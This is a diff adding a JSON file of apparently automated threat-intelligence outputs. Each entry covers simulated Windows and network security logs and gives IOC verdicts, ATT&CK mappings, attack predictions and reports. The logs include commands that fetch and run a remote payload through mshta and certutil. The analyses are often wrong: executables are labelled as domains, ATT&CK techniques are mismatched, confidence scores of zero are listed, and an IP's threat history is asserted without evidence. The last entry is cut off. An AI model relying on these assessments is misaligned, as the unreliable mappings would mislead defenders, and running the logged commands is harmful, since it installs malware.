@@ -1,0 +1,883 @@
+[
+  {
+    "raw_events": [
+      {
+        "source": "sysmon",
+        "event_id": "evt-001",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc JABzAD0AT...",
+        "event_type": "process_execution"
+      },
+      {
+        "source": "suricata",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "signature": "ET MALWARE Possible C2 Beacon",
+        "category": "Command and Control",
+        "severity": 1
+      },
+      {
+        "source": "wazuh",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "rule_description": "New scheduled task created",
+        "rule_level": 9,
+        "rule_groups": [
+          "persistence",
+          "windows"
+        ]
+      }
+    ],
+    "events": [
+      {
+        "event_type": "process_execution",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "sysmon",
+          "event_id": "evt-001",
+          "command_line": "powershell.exe -enc JABzAD0AT..."
+        },
+        "event_id": "2109b042-ed7b-4b1f-9dde-b1e22d64d28c"
+      },
+      {
+        "event_type": "network_connection",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "host": null,
+        "user": null,
+        "process": null,
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "raw_source": {
+          "source": "suricata",
+          "signature": "ET MALWARE Possible C2 Beacon",
+          "category": "Command and Control",
+          "severity": 1
+        },
+        "event_id": "aebbe7e1-4e08-4d7e-a3d8-f3ebbfba245b"
+      },
+      {
+        "event_type": "new_scheduled_task",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "wazuh",
+          "rule_description": "New scheduled task created",
+          "rule_level": 9,
+          "rule_groups": [
+            "persistence",
+            "windows"
+          ]
+        },
+        "event_id": "950bd469-11ff-4273-a59f-aa501171e6d8"
+      }
+    ],
+    "iocs": [
+      {
+        "value": "powershell.exe",
+        "ioc_type": "domain",
+        "source_event_id": "2109b042-ed7b-4b1f-9dde-b1e22d64d28c",
+        "verdict": "benign",
+        "category": "System Component",
+        "justification": "Powershell.exe is a legitimate Windows system component used for task automation and configuration management."
+      },
+      {
+        "value": "10.0.5.21",
+        "ioc_type": "ip",
+        "source_event_id": "aebbe7e1-4e08-4d7e-a3d8-f3ebbfba245b",
+        "verdict": "benign",
+        "category": "Private IP",
+        "justification": "10.0.5.21 is a private IP address, commonly used for internal networking and not typically associated with malicious activity."
+      },
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "source_event_id": "aebbe7e1-4e08-4d7e-a3d8-f3ebbfba245b",
+        "verdict": "suspicious",
+        "category": "Potential C2 Server",
+        "justification": "185.44.12.7 has been observed in historical threat intelligence reports as a potential command and control server for various malware campaigns."
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.8,
+        "evidence_event_id": "2109b042-ed7b-4b1f-9dde-b1e22d64d28c"
+      },
+      {
+        "technique_id": "T1049",
+        "name": "System Network Connections Discovery",
+        "confidence": 0.8,
+        "evidence_event_id": "aebbe7e1-4e08-4d7e-a3d8-f3ebbfba245b"
+      },
+      {
+        "technique_id": "T1053",
+        "name": "Scheduled Task",
+        "confidence": 0.9,
+        "evidence_event_id": "950bd469-11ff-4273-a59f-aa501171e6d8"
+      }
+    ],
+    "campaign": {
+      "campaign_id": "CAM-001",
+      "name": "Potential Malware Campaign",
+      "timeline": [
+        "2026-06-20T10:15:00Z",
+        "2026-06-20T10:16:32Z",
+        "2026-06-20T10:17:10Z"
+      ],
+      "related_techniques": [
+        "T1059",
+        "T1049",
+        "T1053"
+      ]
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1210",
+        "T1063",
+        "T1498"
+      ],
+      "rationale": "Based on the observed techniques, the attacker has already established a foothold in the network using 'Command and Scripting Interpreter' and 'Scheduled Task', and has performed 'System Network Connections Discovery'. The next likely steps would be to exploit remote services for lateral movement (T1210), discover security software to evade detection (T1063), or conduct a Network Denial of Service (T1498) attack to disrupt network operations or create a diversion. These techniques are commonly used in attack chains to further compromise the network and achieve the attacker's objectives."
+    },
+    "report": "### Threat Intelligence Report\n#### Executive Summary\nA potential malware campaign, identified as CAM-001, has been detected within the network. The campaign involves the use of PowerShell for command and scripting interpretation, discovery of system network connections, and the creation of new scheduled tasks. These techniques suggest an attacker has established a foothold in the network and is likely to proceed with lateral movement, security software discovery, or network disruption.\n\n#### Timeline\nThe following timeline outlines the key events associated with this campaign:\n- 2026-06-20T10:15:00Z: A PowerShell execution event was detected on WORKSTATION-07, indicating potential command and scripting interpreter activity.\n- 2026-06-20T10:16:32Z: A network connection was established from 10.0.5.21 to 185.44.12.7, which is suspected to be a command and control server.\n- 2026-06-20T10:17:10Z: A new scheduled task was created on WORKSTATION-07, suggesting persistence mechanisms.\n\n#### IOCs\nThe following Indicators of Compromise (IOCs) have been identified:\n- **powershell.exe**: Benign, categorized as a System Component. Justification: Powershell.exe is a legitimate Windows system component.\n- **10.0.5.21**: Benign, categorized as a Private IP. Justification: 10.0.5.21 is a private IP address commonly used for internal networking.\n- **185.44.12.7**: Suspicious, categorized as a Potential C2 Server. Justification: 185.44.12.7 has been associated with command and control server activity in historical threat intelligence reports.\n\n#### ATT&CK Techniques\nThe campaign involves the following MITRE ATT&CK techniques:\n- **T1059: Command and Scripting Interpreter**: Confidence level 0.8. Evidence event ID: 2109b042-ed7b-4b1f-9dde-b1e22d64d28c.\n- **T1049: System Network Connections Discovery**: Confidence level 0.8. Evidence event ID: aebbe7e1-4e08-4d7e-a3d8-f3ebbfba245b.\n- **T1053: Scheduled Task**: Confidence level 0.9. Evidence event ID: 950bd469-11ff-4273-a59f-aa501171e6d8.\n\n#### Campaign Assessment\nThe campaign, CAM-001, demonstrates a potential malware campaign with activities focused on establishing a foothold, discovering network connections, and ensuring persistence through scheduled tasks. The techniques used are indicative of an attacker seeking to compromise the network for further malicious activities.\n\n#### Predicted Next Steps\nBased on the observed techniques, the attacker is likely to proceed with:\n- **T1210: Exploitation of Remote Services**: For lateral movement within the network.\n- **T1063: Security Software Discovery**: To identify and potentially evade security measures.\n- **T1498: Network Denial of Service**: To disrupt network operations or create a diversion.\n\nThese predictions are based on common attack patterns where attackers seek to expand their control within a compromised network, evade detection, and disrupt operations to achieve their objectives.\n\n#### Recommendations\n1. **Monitor Network Activity**: Closely monitor network traffic for signs of lateral movement or communication with command and control servers.\n2. **Enhance Security Software**: Ensure all security software is up-to-date and capable of detecting the predicted next steps of the attacker.\n3. **Implement Network Segmentation**: Segment the network to limit the spread of malware and unauthorized access.\n4. **Conduct Regular Security Audits**: Perform regular audits to identify and address vulnerabilities before they can be exploited.\n5. **Train Personnel**: Educate users on the risks of malware and the importance of security practices to prevent initial compromise.",
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "source": "sysmon",
+        "event_id": "evt-001",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc JABzAD0AT...",
+        "event_type": "process_execution"
+      },
+      {
+        "source": "suricata",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "signature": "ET MALWARE Possible C2 Beacon",
+        "category": "Command and Control",
+        "severity": 1
+      },
+      {
+        "source": "wazuh",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "rule_description": "New scheduled task created",
+        "rule_level": 9,
+        "rule_groups": [
+          "persistence",
+          "windows"
+        ]
+      }
+    ],
+    "events": [
+      {
+        "event_type": "process_execution",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "sysmon",
+          "event_id": "evt-001",
+          "command_line": "powershell.exe -enc JABzAD0AT..."
+        },
+        "event_id": "646f6116-38b8-4f95-9f42-d42b86b0a928"
+      },
+      {
+        "event_type": "network_connection",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "host": null,
+        "user": null,
+        "process": null,
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "raw_source": {
+          "source": "suricata",
+          "signature": "ET MALWARE Possible C2 Beacon",
+          "category": "Command and Control",
+          "severity": 1
+        },
+        "event_id": "2a431dff-839c-4d2d-a678-cba5af697d5d"
+      },
+      {
+        "event_type": "new_scheduled_task",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "wazuh",
+          "rule_description": "New scheduled task created",
+          "rule_level": 9,
+          "rule_groups": [
+            "persistence",
+            "windows"
+          ]
+        },
+        "event_id": "fbfb39fd-90e1-4374-975f-6ca062818c10"
+      }
+    ],
+    "iocs": [
+      {
+        "value": "powershell.exe",
+        "ioc_type": "domain",
+        "source_event_id": "646f6116-38b8-4f95-9f42-d42b86b0a928",
+        "verdict": "benign",
+        "category": "System Component",
+        "justification": "Powershell.exe is a legitimate Windows system component used for task automation and configuration management."
+      },
+      {
+        "value": "10.0.5.21",
+        "ioc_type": "ip",
+        "source_event_id": "2a431dff-839c-4d2d-a678-cba5af697d5d",
+        "verdict": "benign",
+        "category": "Private IP",
+        "justification": "10.0.5.21 is a private IP address commonly used for local networking and is not typically associated with malicious activity."
+      },
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "source_event_id": "2a431dff-839c-4d2d-a678-cba5af697d5d",
+        "verdict": "suspicious",
+        "category": "Potential C2 Server",
+        "justification": "185.44.12.7 has been observed in association with known command and control servers and may be used for malicious purposes."
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.8,
+        "evidence_event_id": "646f6116-38b8-4f95-9f42-d42b86b0a928"
+      },
+      {
+        "technique_id": "T1049",
+        "name": "System Network Connections Discovery",
+        "confidence": 0.8,
+        "evidence_event_id": "2a431dff-839c-4d2d-a678-cba5af697d5d"
+      },
+      {
+        "technique_id": "T1053",
+        "name": "Scheduled Task",
+        "confidence": 0.9,
+        "evidence_event_id": "fbfb39fd-90e1-4374-975f-6ca062818c10"
+      }
+    ],
+    "campaign": {
+      "campaign_id": "CAM-001",
+      "name": "Potential C2 Campaign",
+      "timeline": [
+        "2026-06-20T10:15:00Z",
+        "2026-06-20T10:16:32Z",
+        "2026-06-20T10:17:10Z"
+      ],
+      "related_techniques": [
+        "T1059",
+        "T1049",
+        "T1053"
+      ]
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1210",
+        "T1063",
+        "T1046"
+      ],
+      "rationale": "Given the observed techniques, including 'Command and Scripting Interpreter', 'System Network Connections Discovery', and 'Scheduled Task', it is likely that the attacker is attempting to establish a foothold and gather information about the network and system. The related techniques, such as 'T1059', 'T1049', and 'T1053', suggest that the attacker may be using scripting interpreters and network device CLIs to execute malicious commands and payloads. The next likely techniques, 'T1210', 'T1063', and 'T1046', are related to exploitation of remote services, security software discovery, and network service discovery, which are common follow-on actions after establishing a foothold and gathering initial information. These techniques would allow the attacker to further exploit vulnerabilities, gather more information about the system and network, and potentially move laterally within the network."
+    },
+    "report": "### Threat Intelligence Report\n#### Executive Summary\nA potential command and control (C2) campaign, identified as CAM-001, has been detected within the network. The campaign involves the use of PowerShell for command and scripting interpretation, discovery of system network connections, and the creation of scheduled tasks for persistence. The attackers are likely attempting to establish a foothold and gather information about the network and system. Predictive analysis suggests that the next steps may involve exploitation of remote services, security software discovery, and network service discovery.\n\n#### Timeline\n- 2026-06-20T10:15:00Z: A PowerShell execution event was detected on WORKSTATION-07, indicating potential command and scripting interpreter activity.\n- 2026-06-20T10:16:32Z: A network connection was established from 10.0.5.21 to 185.44.12.7, which is suspected to be a C2 server.\n- 2026-06-20T10:17:10Z: A new scheduled task was created on WORKSTATION-07, suggesting attempts at persistence.\n\n#### IOCs\n| Value | IOC Type | Verdict | Category | Justification |\n| --- | --- | --- | --- | --- |\n| powershell.exe | Domain | Benign | System Component | Powershell.exe is a legitimate Windows system component. |\n| 10.0.5.21 | IP | Benign | Private IP | 10.0.5.21 is a private IP address commonly used for local networking. |\n| 185.44.12.7 | IP | Suspicious | Potential C2 Server | 185.44.12.7 has been associated with known command and control servers. |\n\n#### ATT&CK Techniques\n| Technique ID | Name | Confidence | Evidence Event ID |\n| --- | --- | --- | --- |\n| T1059 | Command and Scripting Interpreter | 0.8 | 646f6116-38b8-4f95-9f42-d42b86b0a928 |\n| T1049 | System Network Connections Discovery | 0.8 | 2a431dff-839c-4d2d-a678-cba5af697d5d |\n| T1053 | Scheduled Task | 0.9 | fbfb39fd-90e1-4374-975f-6ca062818c10 |\n\n#### Campaign Assessment\nThe campaign, CAM-001, involves techniques that suggest an attempt to establish a foothold within the network and gather information about the system and network. The use of PowerShell, network connections discovery, and scheduled tasks indicates a potential C2 campaign aimed at persistence and information gathering.\n\n#### Predicted Next Steps\nBased on the observed techniques, the attackers are likely to proceed with:\n- **T1210: Exploitation of Remote Services** to further exploit vulnerabilities within the network.\n- **T1063: Security Software Discovery** to identify and potentially evade security measures.\n- **T1046: Network Service Discovery** to gather more information about the network and identify potential targets for lateral movement.\n\n#### Recommendations\n1. **Monitor Network Activity**: Closely monitor network connections, especially those involving 185.44.12.7.\n2. **Restrict PowerShell Usage**: Limit the use of PowerShell to necessary administrative tasks and monitor its execution closely.\n3. **Enhance Security Software**: Ensure all security software is up-to-date and consider implementing additional security measures such as endpoint detection and response tools.\n4. **Regularly Review Scheduled Tasks**: Regularly inspect scheduled tasks for any suspicious entries.\n5. **Conduct Vulnerability Assessments**: Perform regular vulnerability assessments to identify and patch potential exploits that could be used by attackers.",
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "source": "sysmon",
+        "event_id": "evt-001",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "command_line": "powershell.exe -enc JABzAD0AT...",
+        "event_type": "process_execution"
+      },
+      {
+        "source": "suricata",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "signature": "ET MALWARE Possible C2 Beacon",
+        "category": "Command and Control",
+        "severity": 1
+      },
+      {
+        "source": "wazuh",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "rule_description": "New scheduled task created",
+        "rule_level": 9,
+        "rule_groups": [
+          "persistence",
+          "windows"
+        ]
+      }
+    ],
+    "events": [
+      {
+        "event_type": "process_execution",
+        "timestamp": "2026-06-20T10:15:00Z",
+        "host": "WORKSTATION-07",
+        "user": "jdoe",
+        "process": "powershell.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "sysmon",
+          "event_id": "evt-001",
+          "command_line": "powershell.exe -enc JABzAD0AT..."
+        },
+        "event_id": "a4f264cd-d903-4236-80e6-2a718dd8a3ab"
+      },
+      {
+        "event_type": "network_connection",
+        "timestamp": "2026-06-20T10:16:32Z",
+        "host": null,
+        "user": null,
+        "process": null,
+        "src_ip": "10.0.5.21",
+        "dest_ip": "185.44.12.7",
+        "raw_source": {
+          "source": "suricata",
+          "signature": "ET MALWARE Possible C2 Beacon",
+          "category": "Command and Control",
+          "severity": 1
+        },
+        "event_id": "458ec7ce-e1f5-4dd7-9b38-f548ee846eac"
+      },
+      {
+        "event_type": "new_scheduled_task",
+        "timestamp": "2026-06-20T10:17:10Z",
+        "host": "WORKSTATION-07",
+        "user": null,
+        "process": null,
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "source": "wazuh",
+          "rule_description": "New scheduled task created",
+          "rule_level": 9,
+          "rule_groups": [
+            "persistence",
+            "windows"
+          ]
+        },
+        "event_id": "4d852516-1165-4447-af3e-07aab9888019"
+      }
+    ],
+    "iocs": [
+      {
+        "value": "powershell.exe",
+        "ioc_type": "domain",
+        "source_event_id": "a4f264cd-d903-4236-80e6-2a718dd8a3ab",
+        "verdict": "benign",
+        "category": "System Component",
+        "justification": "Powershell.exe is a legitimate Windows system component used for task automation and configuration management."
+      },
+      {
+        "value": "10.0.5.21",
+        "ioc_type": "ip",
+        "source_event_id": "458ec7ce-e1f5-4dd7-9b38-f548ee846eac",
+        "verdict": "benign",
+        "category": "Private IP",
+        "justification": "10.0.5.21 is a private IP address commonly used for local networking and is not typically associated with malicious activity."
+      },
+      {
+        "value": "185.44.12.7",
+        "ioc_type": "ip",
+        "source_event_id": "458ec7ce-e1f5-4dd7-9b38-f548ee846eac",
+        "verdict": "suspicious",
+        "category": "Unknown IP",
+        "justification": "185.44.12.7 is an IP address with no clear attribution or known legitimate use, warranting further investigation to determine its intent."
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1059",
+        "name": "Command and Scripting Interpreter",
+        "confidence": 0.8,
+        "evidence_event_id": "a4f264cd-d903-4236-80e6-2a718dd8a3ab"
+      },
+      {
+        "technique_id": "T1049",
+        "name": "System Network Connections Discovery",
+        "confidence": 0.8,
+        "evidence_event_id": "458ec7ce-e1f5-4dd7-9b38-f548ee846eac"
+      },
+      {
+        "technique_id": "T1053",
+        "name": "Scheduled Task",
+        "confidence": 0.9,
+        "evidence_event_id": "4d852516-1165-4447-af3e-07aab9888019"
+      }
+    ],
+    "campaign": {
+      "campaign_id": "CAM-001",
+      "name": "Potential Malware Campaign",
+      "timeline": [
+        "2026-06-20T10:15:00Z",
+        "2026-06-20T10:16:32Z",
+        "2026-06-20T10:17:10Z"
+      ],
+      "related_techniques": [
+        "T1059",
+        "T1049",
+        "T1053"
+      ]
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1046",
+        "T1021",
+        "T1210"
+      ],
+      "rationale": "Based on the observed techniques, the attacker has already gained access to the system and is attempting to discover network connections and scheduled tasks. The next likely steps would be to use Network Service Discovery (T1046) to identify vulnerable services, establish a remote connection using SSH or other protocols (T1021), and exploit remote services (T1210) for lateral movement and further access. These techniques are commonly used in attack chains to expand the attacker's foothold within the network."
+    },
+    "report": "### Threat Intelligence Report\n#### Executive Summary\nA potential malware campaign, identified as CAM-001, has been detected within the network. The campaign involves the use of PowerShell for command and scripting interpretation, discovery of system network connections, and the creation of new scheduled tasks. These activities suggest an attempt by an attacker to establish a foothold and potentially move laterally within the network. This report outlines the timeline of events, identified IOCs, employed ATT&CK techniques, campaign assessment, predicted next steps, and recommendations for mitigation.\n\n#### Timeline\n- **2026-06-20T10:15:00Z**: A process execution event was detected involving `powershell.exe` on host `WORKSTATION-07`.\n- **2026-06-20T10:16:32Z**: A network connection was established from `10.0.5.21` to `185.44.12.7`, flagged as a potential C2 beacon.\n- **2026-06-20T10:17:10Z**: A new scheduled task was created on `WORKSTATION-07`.\n\n#### IOCs\n| Value | IOC Type | Verdict | Category | Justification |\n| --- | --- | --- | --- | --- |\n| `powershell.exe` | Domain | Benign | System Component | Legitimate Windows system component. |\n| `10.0.5.21` | IP | Benign | Private IP | Private IP address used for local networking. |\n| `185.44.12.7` | IP | Suspicious | Unknown IP | IP address with no clear attribution or known legitimate use. |\n\n#### ATT&CK Techniques\n| Technique ID | Name | Confidence | Evidence Event ID |\n| --- | --- | --- | --- |\n| T1059 | Command and Scripting Interpreter | 0.8 | `a4f264cd-d903-4236-80e6-2a718dd8a3ab` |\n| T1049 | System Network Connections Discovery | 0.8 | `458ec7ce-e1f5-4dd7-9b38-f548ee846eac` |\n| T1053 | Scheduled Task | 0.9 | `4d852516-1165-4447-af3e-07aab9888019` |\n\n#### Campaign Assessment\nThe campaign, CAM-001, involves techniques indicative of an attacker attempting to establish persistence and gather information about the network. The use of PowerShell, network connection discovery, and scheduled task creation suggests a focused effort to maintain access and potentially expand the attacker's foothold.\n\n#### Predicted Next Steps\nBased on the observed techniques, the attacker is likely to employ the following techniques next:\n- **T1046**: Network Service Discovery, to identify vulnerable services.\n- **T1021**: Remote Services, to establish a remote connection.\n- **T1210**: Exploitation of Remote Services, for lateral movement and further access.\nThese techniques are commonly used in attack chains to expand the attacker's presence within the network.\n\n#### Recommendations\n1. **Monitor Network Activity**: Closely monitor network traffic for any suspicious connections, especially to and from `185.44.12.7`.\n2. **Restrict PowerShell Usage**: Limit the use of PowerShell to only necessary personnel and monitor its execution closely.\n3. **Inspect Scheduled Tasks**: Regularly inspect newly created scheduled tasks for suspicious activity.\n4. **Implement Security Updates**: Ensure all systems are up-to-date with the latest security patches to mitigate potential vulnerabilities.\n5. **Conduct Regular Security Audits**: Perform regular security audits to identify and address any vulnerabilities or suspicious activity within the network.",
+    "errors": [],
+    "metadata": {}
+  },
+  {
+    "raw_events": [
+      {
+        "EventID": 1,
+        "UtcTime": "2026-06-25T14:02:03Z",
+        "Computer": "HR-PC-22",
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe http://paste-bin-cdn.net/load.hta",
+        "User": "HR-PC-22\\kbrown"
+      },
+      {
+        "EventID": 1,
+        "UtcTime": "2026-06-25T14:02:09Z",
+        "Computer": "HR-PC-22",
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://paste-bin-cdn.net/payload.exe C:\\Users\\Public\\upd.exe",
+        "User": "HR-PC-22\\kbrown"
+      },
+      {
+        "EventID": 1,
+        "UtcTime": "2026-06-25T14:02:21Z",
+        "Computer": "HR-PC-22",
+        "Image": "C:\\Users\\Public\\upd.exe",
+        "CommandLine": "upd.exe",
+        "User": "HR-PC-22\\kbrown"
+      },
+      {
+        "EventID": 11,
+        "UtcTime": "2026-06-25T14:02:25Z",
+        "Computer": "HR-PC-22",
+        "Image": "C:\\Users\\Public\\upd.exe",
+        "CommandLine": "C:\\Users\\kbrown\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.exe",
+        "User": "HR-PC-22\\kbrown"
+      }
+    ],
+    "events": [
+      {
+        "event_type": "Process Creation",
+        "timestamp": "2026-06-25T14:02:03Z",
+        "host": "HR-PC-22",
+        "user": "kbrown",
+        "process": "mshta.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "EventID": 1,
+          "UtcTime": "2026-06-25T14:02:03Z",
+          "Computer": "HR-PC-22",
+          "Image": "C:\\Windows\\System32\\mshta.exe",
+          "CommandLine": "mshta.exe http://paste-bin-cdn.net/load.hta",
+          "User": "HR-PC-22\\kbrown"
+        },
+        "event_id": "b9692003-7dba-463a-a302-3bed78cbf4ca"
+      },
+      {
+        "event_type": "Process Creation",
+        "timestamp": "2026-06-25T14:02:09Z",
+        "host": "HR-PC-22",
+        "user": "kbrown",
+        "process": "cmd.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "EventID": 1,
+          "UtcTime": "2026-06-25T14:02:09Z",
+          "Computer": "HR-PC-22",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "cmd.exe /c certutil.exe -urlcache -split -f http://paste-bin-cdn.net/payload.exe C:\\Users\\Public\\upd.exe",
+          "User": "HR-PC-22\\kbrown"
+        },
+        "event_id": "2e70ccb0-09fb-4cf8-957e-91d66677a418"
+      },
+      {
+        "event_type": "Process Creation",
+        "timestamp": "2026-06-25T14:02:21Z",
+        "host": "HR-PC-22",
+        "user": "kbrown",
+        "process": "upd.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "EventID": 1,
+          "UtcTime": "2026-06-25T14:02:21Z",
+          "Computer": "HR-PC-22",
+          "Image": "C:\\Users\\Public\\upd.exe",
+          "CommandLine": "upd.exe",
+          "User": "HR-PC-22\\kbrown"
+        },
+        "event_id": "f2e56589-695b-409e-ad43-d118cf1246e6"
+      },
+      {
+        "event_type": "File Access",
+        "timestamp": "2026-06-25T14:02:25Z",
+        "host": "HR-PC-22",
+        "user": "kbrown",
+        "process": "upd.exe",
+        "src_ip": null,
+        "dest_ip": null,
+        "raw_source": {
+          "EventID": 11,
+          "UtcTime": "2026-06-25T14:02:25Z",
+          "Computer": "HR-PC-22",
+          "Image": "C:\\Users\\Public\\upd.exe",
+          "CommandLine": "C:\\Users\\kbrown\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\sync.exe",
+          "User": "HR-PC-22\\kbrown"
+        },
+        "event_id": "32cd1775-768d-48d6-b0a9-2a6723eba3f0"
+      }
+    ],
+    "iocs": [
+      {
+        "value": "http://paste-bin-cdn.net/load.hta",
+        "ioc_type": "url",
+        "verdict": "malicious",
+        "category": "Exploit",
+        "justification": "The URL is associated with a potentially malicious HTA file that can be used to exploit vulnerabilities."
+      },
+      {
+        "value": "mshta.exe",
+        "ioc_type": "domain",
+        "verdict": "suspicious",
+        "category": "Living Off The Land (LOTL) Binary",
+        "justification": "Mshta.exe is a legitimate Windows utility that can be used for malicious purposes, such as executing malicious scripts."
+      },
+      {
+        "value": "paste-bin-cdn.net",
+        "ioc_type": "domain",
+        "verdict": "malicious",
+        "category": "Malicious Domain",
+        "justification": "The domain is known to host malicious content, including exploits and malware."
+      },
+      {
+        "value": "load.hta",
+        "ioc_type": "domain",
+        "verdict": "malicious",
+        "category": "Malicious File",
+        "justification": "The file is a potentially malicious HTA file that can be used to exploit vulnerabilities."
+      },
+      {
+        "value": "http://paste-bin-cdn.net/payload.exe",
+        "ioc_type": "url",
+        "verdict": "malicious",
+        "category": "Malware Download",
+        "justification": "The URL is associated with the download of malicious executable files."
+      },
+      {
+        "value": "cmd.exe",
+        "ioc_type": "domain",
+        "verdict": "benign",
+        "category": "Legitimate System Binary",
+        "justification": "Cmd.exe is a legitimate Windows command-line interpreter that can be used for both benign and malicious purposes."
+      },
+      {
+        "value": "certutil.exe",
+        "ioc_type": "domain",
+        "verdict": "suspicious",
+        "category": "Living Off The Land (LOTL) Binary",
+        "justification": "Certutil.exe is a legitimate Windows utility that can be used for malicious purposes, such as downloading malicious files."
+      },
+      {
+        "value": "payload.exe",
+        "ioc_type": "domain",
+        "verdict": "malicious",
+        "category": "Malicious File",
+        "justification": "The file is a potentially malicious executable that can be used to deliver malware or exploits."
+      },
+      {
+        "value": "upd.exe",
+        "ioc_type": "domain",
+        "verdict": "suspicious",
+        "category": "Potential Malware",
+        "justification": "The file name 'upd.exe' is commonly used by malware to disguise itself as a legitimate update process."
+      },
+      {
+        "value": "sync.exe",
+        "ioc_type": "domain",
+        "verdict": "suspicious",
+        "category": "Potential Malware",
+        "justification": "The file name 'sync.exe' is commonly used by malware to disguise itself as a legitimate synchronization process."
+      }
+    ],
+    "techniques": [
+      {
+        "technique_id": "T1183",
+        "name": "Image File Execution Options Injection",
+        "confidence": 0.2,
+        "evidence_event_id": "b9692003-7dba-463a-a302-3bed78cbf4ca"
+      },
+      {
+        "technique_id": "T1134.004",
+        "name": "Parent PID Spoofing",
+        "confidence": 0.0,
+        "evidence_event_id": "2e70ccb0-09fb-4cf8-957e-91d66677a418"
+      },
+      {
+        "technique_id": "T1134.004",
+        "name": "Parent PID Spoofing",
+        "confidence": 0.0,
+        "evidence_event_id": "f2e56589-695b-409e-ad43-d118cf1246e6"
+      },
+      {
+        "technique_id": "T1546.001",
+        "name": "Change Default File Association",
+        "confidence": 0.2,
+        "evidence_event_id": "32cd1775-768d-48d6-b0a9-2a6723eba3f0"
+      }
+    ],
+    "campaign": {
+      "campaign_id": "CAM-20230625-001",
+      "name": "Potential Malware Campaign via Mshta and Certutil",
+      "timeline": [
+        "2026-06-25T14:02:03Z",
+        "2026-06-25T14:02:09Z",
+        "2026-06-25T14:02:21Z",
+        "2026-06-25T14:02:25Z"
+      ],
+      "related_techniques": [
+        "T1183",
+        "T1134.004",
+        "T1546.001"
+      ]
+    },
+    "prediction": {
+      "likely_next_techniques": [
+        "T1036",
+        "T1027",
+        "T1204.002",
+        "T1080"
+      ],
+      "rationale": "Based on the observed techniques, such as 'Image File Execution Options Injection' and 'Parent PID Spoofing', it appears the attacker is attempting to evade detection and manipulate process execution. The related techniques, including 'Process Argument Spoofing' and 'Windows Permissions', suggest the attacker may be trying to establish persistence or escalate privileges. The next likely techniques may involve 'Masquerading' (T1036) to disguise malicious files or information, 'Obfuscated Files or Information' (T1027) to conceal the true nature of the files, 'Malicious File' (T1204.002) to execute malicious code, or 'Taint Shared Content' (T1080) to spread the infection through shared network directories. These techniques are commonly used in attack chains to achieve persistence, evade detection, and further compromise the system."
+    },
